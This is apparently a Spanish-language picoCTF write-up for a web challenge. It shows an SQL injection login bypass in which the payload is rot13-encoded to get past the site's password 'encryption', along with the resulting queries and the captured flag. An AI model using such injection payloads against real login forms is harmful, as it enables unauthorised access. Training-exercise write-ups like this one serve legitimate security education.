## descripcion
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## pistas
Seems like the password is encrypted.


## Solution

por medio de la web se realizo el metodo 

en este problema se encripta la contraseña con rot13 por lo que cambia nuestra injeccion sql

se tiene que convertir la contraseña en rot13 para que asi se pueda ingresar cuando el encriptador la encripte.

```
password: ' or 1==1;
SQL query: SELECT * FROM admin where password = '' be 1==1;'



password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}

```

## notas

Comandos utilizados:
	1.

## references
